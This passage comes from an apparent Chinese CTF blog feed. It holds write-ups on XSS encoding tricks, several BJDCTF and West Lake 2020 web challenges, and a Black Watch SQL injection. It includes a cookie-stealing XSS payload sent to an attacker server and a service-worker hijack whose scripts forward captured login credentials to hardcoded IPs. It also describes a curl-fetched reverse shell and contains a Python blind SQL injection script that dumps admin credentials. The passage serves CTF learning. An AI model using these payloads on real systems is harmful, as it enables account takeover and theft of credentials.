<p>get传参时不会对%进行再次编码，且存在部分特殊符号<code>&amp; #</code>不被编码，存在特殊意义，可以将其编码输入将其作为无特殊意义字符传入<br>post传参时会对%进行再次编码<br>HTML的这个编码好像只能在字符串（值）中生效，不能用来直接分隔像onclick，onmousemove这些函数上<br>若无引号进行使用，%09会使值产生截断被解析为两个元素<br>但是&amp;#09;不会产生问题<br>切记：%09无引号情况下会导致空格产生截断！！！</p>
<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>%09是url编码，&amp;#09;为实体编码，url编码在数据发送至后台时进行转码，在引号闭合的情况下，%09被作为内部字符串处理，成为一个空格；在引号未闭合的情况下，成为制表符，使得内容被解析为两个元素。&amp;#09;为实体编码，在浏览器最后输出时被解析，然后被去除</p>
<h2 id="内联标签"><a href="#内联标签" class="headerlink" title="内联标签"></a>内联标签</h2><p>&lt;iframe&gt;&lt;&#x2F;iframe&gt;，定义一个内联标签，内部可使用scr&#x3D;定义链接<br>例：<code>&lt;iframe src=&quot;javas&amp;#09;cript:alert(document.domain)&quot;&gt;</code><br>可代替&lt;a&gt;标签</p>
<h2 id="IE特性"><a href="#IE特性" class="headerlink" title="IE特性"></a>IE特性</h2><p>老版本IE才具有的古老漏洞</p>
<h3 id="解析为’"><a href="#解析为’" class="headerlink" title="`解析为’"></a>`解析为’</h3><h3 id="expression表达式"><a href="#expression表达式" class="headerlink" title="expression表达式"></a>expression表达式</h3><p>可用在css下执行js语句<br><code>expression(alert(document.domain));</code></p>
<h2 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h2><p>&#x2F;**&#x2F;用注释符隔断字符阻止匹配，但不影响语句正常执行</p>
<h2 id="xss和实体编码的关系"><a href="#xss和实体编码的关系" class="headerlink" title="xss和实体编码的关系"></a>xss和实体编码的关系</h2><p>浏览器先解析HTML生成DOM树，然后解析CSS，结合，渲染<br>实体编码被转换成字符是在DOM树生成之后的，但DOM树生成完成后各节点以固定，此时被解析出来的&lt;&gt;无法再次形成新的节点，但实体编码解析后生成的js代码仍能正常解析<br>一篇文章<br><a href="https://www.cnblogs.com/escape-w/p/10162831.html">https://www.cnblogs.com/escape-w/p/10162831.html</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>[BJDCTF 2nd]部分wp</title>
    <url>/%5BBJDCTF%202nd%5D%E9%83%A8%E5%88%86wp.html</url>
    <content><![CDATA[<h1 id="BJDCTF-2nd-部分wp"><a href="#BJDCTF-2nd-部分wp" class="headerlink" title="[BJDCTF 2nd]部分wp"></a>[BJDCTF 2nd]部分wp</h1><p>据说是萌新赛，就目前做的几个题来说的确较为简单</p>
<h2 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h2><p>SSTI，测一下可以发现用的jinja2，搜一个payload直接打<br>SSTI上一次的BJDCTF也考过，具体判断什么的可以看上次比赛的WP</p>
<h2 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h2><p>ThinkPHP5，开了debug模式，随便触发一个错误看一眼thinkPHP版本，然后继续搜payload打</p>
<h2 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h2><p>反弹shell，用了swp源码泄漏，过滤了重定向符&gt;，使得直接弹shell不行了，但是方法还是很多的，搜一下发现一个curl反弹的，在自己的机子上放一个文件里面写一个弹shell的语句就可以了<br><a href="https://www.cnblogs.com/-zhong/p/11398877.html">https://www.cnblogs.com/-zhong/p/11398877.html</a></p>
<p>师傅还提到一个用if语句类似盲注的方法可以把flag测出来</p>
<h2 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h2><p>过滤了一大堆东西，<code>;=&#39;&quot;like select and &amp;&amp; or --</code>什么的都没了<br>说实话感觉很棘手，因为没有select就没法做绝大多数的注入了，而去掉了分号就没法堆叠注入，感觉一度陷入困境<br>但是今天又学习到了新知识，像<code>select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;</code>这种语句，我们可以username&#x3D;\&amp;password&#x3D;or sleep(5) #进行注入，<br>这样子原语句就变成了<code>select * from users where username=&#39;\&#39; and password=&#39;or sleep(5) # &#39;</code><br>这样子就有一个可以操控的注入点了<br>但是没有select仍然没法进行太多的操作，但是这里我们只需要获得一个password就可以了<br>发现or 后面的逻辑为true时是回显是BJD needs to be stronger，而为false时是xxx need girlfriend，就显然是一个盲注了<br>用<code>or ascii(substr(password,%s,1))&lt;%s # </code>这样子一句盲注就可以拿到密码，使用admin账户登录获得flag，这里注意substr不能从0开始，从1开始截取的才是第一位</p>
<p>从这里开始后面的题都是比赛结束之后看的</p>
<h2 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h2><p>不明所以的题名，还是个藏比，着实没意思<br>进去有登录框，登录admin会失败，剩下的随便登录，会回显登录的用户名，一开始想试ssti，或者注入，无果。<br>查看源码无果，扫描无果<br>最后看的wp，用burp抓包会在登录时有一个重定向，会告诉你一个隐藏的L0g1n.php （说实话感觉藏比题没意思）<br>进去之后是考http头的，萌新题，不过出现了两个没见过的http头<br>一个是要求你从localhost访问，但是不能用XFF，伪造remoteAddr显然不可能，所以找替代品Client-IP<br>要求使用Commodo 64的浏览器访问，查了半天还查不到是什么，最后看wp是一个叫Commodore 64的操作系统（为什么搜不到呢）<br>要求从某个邮箱访问：From<br>要求使用VPN：Via</p>
<h2 id="element-master"><a href="#element-master" class="headerlink" title="element master"></a>element master</h2><p>藏，审查源码可以看到一个Po.php的ASCII码形式，访问之后得到一个点？？？？令人困惑<br>然后试着输入几个其他的化学元素，一开始使得H，O，之类的记得住的元素没反应，后来随手打了个Ar有反应了，发现靠后的元素会有其他的字符出现，随便写个脚本遍历元素周期表就可以了，得到一个PHP文件名，访问获得flag</p>
<h2 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h2><p>又是藏，.git源码泄漏，用Githack拉下来，就给了一个<code>echo unserialize($a);</code>，那么思路就必然是原生类的反序列化了，稍微搜一下就你看见lemon神仙的一篇文章，exception类使用__toString的反序列化<br>刚好这个类可以xss，点题<br>但是我也不知道flag在哪啊，xss也不是很熟练，我知道的xss好像就盗cookie，那写一个payload把cookie发到自己服务器上就可以了<br>payload：<code>&lt;script&gt;document.write(&quot;&lt;img src=&#39;http://server:10004?c=&quot; + escape(document.cookie) + &quot;&#39;&gt;&quot;)&lt;/script&gt;</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[西湖论剑2020]HardXSS</title>
    <url>/%5B2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%5DHardXSS.html</url>
    <content><![CDATA[<h1 id="西湖论剑2020-HardXSS"><a href="#西湖论剑2020-HardXSS" class="headerlink" title="[西湖论剑2020]HardXSS"></a>[西湖论剑2020]HardXSS</h1><p>西湖论剑加bytectf连遇到两个前端题，终于该好好学习一下前端安全了</p>
<h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>jsonp是为了跨域获取数据而产生的一种临时方案，现在通常使用更牛逼的CORS，jsonp的简单实现就是在HTML页面上定义一些函数，不妨就叫它callBackFunc，然后用script的src&#x3D;xxx.com&#x2F;callback&#x3D;callBackFunc 导入，服务端那边就整一个类似于如下代码的方式返回回去，这样子返回回去就是函数的形式可以直接执行</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type: application/json'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//获取回调函数名</span>
<span class="token variable">$jsoncallback</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token punctuation">[</span><span class="token string">'jsoncallback'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//json数据</span>
<span class="token comment" spellcheck="true">//进行一些处理获得json格式的data</span>
<span class="token variable">$json_data</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//输出jsonp格式的数据</span>
<span class="token keyword">echo</span> <span class="token variable">$jsoncallback</span> <span class="token punctuation">.</span> <span class="token string">"("</span> <span class="token punctuation">.</span> <span class="token variable">$json_data</span> <span class="token punctuation">.</span> <span class="token string">")"</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>这样子src拿到的结果就是callBackFunc({“data”: “data”})这样的形式，实现跨域请求资源的获取</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>这个题后来给了个hint是打service worker，然后我就看了一天的service worker<br>直接抓包可以看到cookie是httponly的，也就意味着直接盗取cookie不太行了，并且admin说是先打开网站再登录，应该也没法拿到cookie，因此我们才提出了使用service worker直接在它浏览器里面注册一个窃听线程<br>打开题目首先看到的是<a href="https://xss.hardxss.xhlj.wetolink.com/">https://xss.hardxss.xhlj.wetolink.com/</a> 这么个网站，给了一个子域名爆破功能，（后来发现是前端实现的，想了半天这里怎么会有xss）<br>还有一个admin login按钮，点了之后进login路由，在这个页面可以看到一个jsonp</p>
<pre class=" language-javascript"><code class="language-javascript">callback <span class="token operator">=</span> <span class="token string">"get_user_login_status"</span><span class="token punctuation">;</span>
<span class="token function">auto_reg_var</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>jump_url<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"undefined"</span> <span class="token operator">||</span> <span class="token regex">/^\//</span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>jump_url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    jump_url <span class="token operator">=</span> <span class="token string">"/"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">jsonp</span><span class="token punctuation">(</span><span class="token string">"https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback="</span> <span class="token operator">+</span> callback<span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token string">'status'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        location<span class="token punctuation">.</span>href <span class="token operator">=</span> jump_url<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">function</span> <span class="token function">jsonp</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> success<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"callback"</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> funName <span class="token operator">=</span> <span class="token string">'callback_'</span> <span class="token operator">+</span> Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"?"</span> <span class="token operator">+</span> <span class="token string">"callback="</span> <span class="token operator">+</span> funName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> funName <span class="token operator">=</span> callback<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    window<span class="token punctuation">[</span>funName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">success</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">delete</span> window<span class="token punctuation">[</span>funName<span class="token punctuation">]</span><span class="token punctuation">;</span>
        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    script<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">auto_reg_var</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> search <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> search_arr <span class="token operator">=</span> search<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> search_arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token punctuation">[</span>key<span class="token punctuation">,</span>value<span class="token punctuation">]</span> <span class="token operator">=</span> search_arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        window<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里一开始就没定义能用jsonp回调的函数，我就很懵逼了，就一开始定义的get_user_login_status也是不存在的，看傻了<br>auto_reg_var就是解析参数用的，你如果GET方式提交了callback就能把它原先定义的get_user_login_status给覆盖掉<br>jsonp函数整了一大堆有的没的，反正最后就是用src标签加载了一下，并且也append到DOM里了<br>抓包看了一下怎么处理的数据，发现处理过程就是类似于<code>echo $_GET[&#39;callback&#39;].&quot;(&#123;&quot;status&quot;:false&#125;)&quot;;</code>，过滤等于0，可以考虑命令执行了</p>
<h3 id="传递内置函数"><a href="#传递内置函数" class="headerlink" title="传递内置函数"></a>传递内置函数</h3><p>虽然这里什么能用的函数都没有定义，但是内置的函数好像也还蛮多的，比如alert<br>让callback&#x3D;alert，拿到了一个alert({“status”:false})，参数类型不对不能执行，整一个callback&#x3D;alert(1);传回来一个alert(1);({“status”:false})，弹了个窗，执行成功<br>然后最牛逼的就是eval也是内置函数，开始为所欲为起来了</p>
<p>官方wp里有提到回调函数的长度被限制在了50，估计是后端的限制，这样子就只能引入外部js文件注册service worker来打了</p>
<h3 id="service-worker"><a href="#service-worker" class="headerlink" title="service worker"></a>service worker</h3><p>service worker是相当于中间人的一个组件，注册之后是留在用户浏览器上的，Service Worker 可以简单的理解为是一个代理，可以拦截网络请求，修改返回内容等。小burp？<br>由于没有https，接下来的就只能是处于理论学习了，哪天整到一个https之后再实践一下呜呜呜</p>
<p>需要两个脚本完成攻击，一个设置document.domain并引入service worker，另一个注册service worker<br>因为用户名和密码是发送到auth下的，而service worker只能控制其注册域下的请求，fetch方法能劫持我们的HTTP响应，并让我们以自己的形式操作它<br>官方文档里也有说 </p>
<blockquote>
<p>service worker 只能抓取在 service worker scope 里从客户端发出的请求。</p>
</blockquote>
<p>但是我不知道怎么抓取客户端发送的请求然后转发出来，不然估计就可以在xss域名下注册个sw完成攻击了<br>（这段没太懂）</p>
<p>1.js用importScripts加载外域脚本，设置本身的document.domain，并且将auth放到iframe里面，实现跨域</p>
<pre class=" language-javascript"><code class="language-javascript">document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">"hardxss.xhlj.wetolink.com"</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> iff <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
iff<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'https://auth.hardxss.xhlj.wetolink.com/'</span><span class="token punctuation">;</span>
iff<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"load"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">iffLoadover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iff<span class="token punctuation">)</span><span class="token punctuation">;</span>
exp <span class="token operator">=</span> <span class="token template-string"><span class="token string">`navigator.serviceWorker.register("/api/loginStatus?callback=self.importScripts('//404.buuoj.cn/a/sw.js')//")`</span></span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">iffLoadover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    iff<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>service worker不能放置在非同源的域上，serviceWorker.register方法中的scriptURL需要指定service worker的位置，且该位置不能是本域以外的位置，且必须是localhost或https，理论上是不能加载我们的外部脚本的，但这里我们可以用这个jsonp的漏洞将我们自己服务器上的脚本导入进来成本地的，就是这个payload<code>/api/loginStatus?callback=self.importScripts(&#39;//404.buuoj.cn/a/sw.js&#39;)//</code><br>但是我不知道这个&#x2F;&#x2F;是干什么的<br>又，service worker注册的情况需要返回值的content-type是如下几种类型</p>
<blockquote>
<p>text&#x2F;javascript<br>application&#x2F;x-javascript<br>application&#x2F;javascript</p>
</blockquote>
<p>但jsonp返回的content-type刚好是text&#x2F;javascript，所以jsonp+service worker是不是应该是一个经典xss组合</p>
<p>sw.js用来注册service worker</p>
<pre class=" language-javascript"><code class="language-javascript">self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'install ok!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
        event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span>
        caches<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">requestBackend</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>
   <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">requestBackend</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">var</span> url <span class="token operator">=</span> event<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Response</span><span class="token punctuation">(</span><span class="token string">"&lt;script>location='http://120.92.217.158:9999/'+location.search;&lt;/script>"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>headers<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre>
<p>最终payload就为<br><a href="https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%27http://47.103.140.44/1.js%27);//">https://xss.hardxss.xhlj.wetolink.com/login?callback=jsonp(%27http://47.103.140.44/1.js%27);//</a><br>这个题用importScripts做回调函数会报错没定义，所以就用jsonp来导入1.js再导入sw.js<br>但是我没有https，不给导入，就不知道能不能成了。。。</p>
<p>sw把这个请求的回复变成了一个script，自动的把url里面的参数发到了我们对应的服务器上<br>用location.search获取？后面的参数，发送出来，获取到admin的账号密码</p>
<h3 id="11-3修订"><a href="#11-3修订" class="headerlink" title="11.3修订"></a>11.3修订</h3><p>再看了一下service worker，加上rmb神仙的亲手指导，我完全懂了（大概）。sw确切的作用应该是截取用户的请求并返回对应的数据，正常使用就是加载外部资源图片之类的时候可以缓存一手，下次请求就不用再去下载了。也就是说只能拦截在当前域下发出的请求，在这个页面下的请求为一个跨域请求时同样会经手service worker。从其他域去加载sw注册域下的资源是不会经手service worker的。<br>这个题这里是xss向auth下发起一个请求，按照我们上面的理论应该是不能获取到数据的，但表单会改window.location，域就变成 auth.xss 了，这个请求就是从auth下发出的了，就能截获了<br>这里看xss下的登录表单，用的是GET方法，所以用location.search获取GET的数据，如果用的是POST，就用event.request.body获取</p>
<p>官方文档有如下解释</p>
<blockquote>
<p>A fetch event fires every time any resource controlled by a service worker is fetched, <strong>which includes the documents inside the specified scope, and any resources referenced in those documents</strong> (for example if index.html makes a cross origin request to embed an image, that still goes through its service worker.)</p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://lightless.me/archives/XSS-With-Service-Worker.html">https://lightless.me/archives/XSS-With-Service-Worker.html</a><br><a href="https://zhuanlan.zhihu.com/p/29734820">https://zhuanlan.zhihu.com/p/29734820</a><br><a href="https://blogs.akamai.com/sitr/2020/01/abusing-the-service-workers-api.html">https://blogs.akamai.com/sitr/2020/01/abusing-the-service-workers-api.html</a></p>
<p>官方文档<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>Service worker</tag>
      </tags>
  </entry>
  <entry>
    <title>[Black Watch入群题]web</title>
    <url>/%5BBlack%20Watch%E5%85%A5%E7%BE%A4%E9%A2%98%5Dweb.html</url>
    <content><![CDATA[<h1 id="Black-Watch入群题-web"><a href="#Black-Watch入群题-web" class="headerlink" title="[Black Watch入群题]web"></a>[Black Watch入群题]web</h1><p>好像是很老的入群题，已经作废了，很简单的SQL注入，本来这个难度不应该记的，不过使用了强力的前后端分离高级技术，还是记一下</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>简单检查，点来点去就是几个路由和一个登陆，路由的话第一反应就是JavaScript的题，看一下源码<br>包含了一堆乱七八糟名字的js文件，点开一看奇大无比，估计是用的Vue，我最近新学的前后端分离，可以让前端和后端完全不是一个服务，前端把路由什么的解析掉转换成后端需要的格式，再让你发起一个请求，前后端都可以部署在不同的服务器上，太高级了。你看现在url解析的是路由一样的目录，搞不好后端就给你运行一个PHP，前端的长的离谱的代码就把它给怎么解析一下转换过去了</p>
<p>使用burp直接抓包看，前端无论整的多复杂终究是前端，处理的结果终究还是要老老实实的发出来<br>果不其然的看到了后端内容，还真跑的是个PHP，<code>/backend/content_detail.php?id=1</code><br>哦？超级简单SQL盲注，仅过滤了union空格和&#x2F;**&#x2F;，用tab代替空格脚本一把梭</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://fe0db9f4-6714-4c35-9814-ed86337ece0a.node3.buuoj.cn/backend/content_detail.php?id="</span>
<span class="token comment" spellcheck="true"># payload = "0 or ascii(substr((select group_concat(table_name) from information_schema.tables" \</span>
<span class="token comment" spellcheck="true">#           " where table_schema=database()),{},1))={}".replace(' ', '%09')</span>
<span class="token comment" spellcheck="true"># admin,contents</span>
<span class="token comment" spellcheck="true"># payload = "0 or ascii(substr((select group_concat(column_name) from information_schema.columns" \</span>
<span class="token comment" spellcheck="true">#           " where table_name='admin'),{},1))={}".replace(' ', '%09')</span>
<span class="token comment" spellcheck="true"># id,username,password,is_enable</span>
payload <span class="token operator">=</span> <span class="token string">"0 or ascii(substr((select group_concat(username,0x3a,password) from admin"</span> \
          <span class="token string">"),{},1))={}"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'%09'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># 3c7baf5a:d8f56d82,a7462eea:f029f0ea</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(url+payload.format(str(j), str(i)))</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># print(res.text)</span>
        <span class="token keyword">if</span> <span class="token string">"[]"</span> <span class="token operator">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
            flag <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
</code></pre>
<p>拿到两个账号密码，第二个登录拿到flag</p>
]]></content>
  </entry>
  <entry>
    <title>BJDCTF2020 部分wp</title>
    <url>/%5BBJDCTF2020%5D%E9%83%A8%E5%88%86wp.html</url>
    <content><![CDATA[<h1 id="BJDCTF2020-部分wp"><a href="#BJDCTF2020-部分wp" class="headerlink" title="[BJDCTF2020]部分wp"></a>[BJDCTF2020]部分wp</h1><p>buu平台上的一些bjdctf的题，记录一下</p>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>被戏耍了，完全是一个动脑题，输在愚钝上</p>
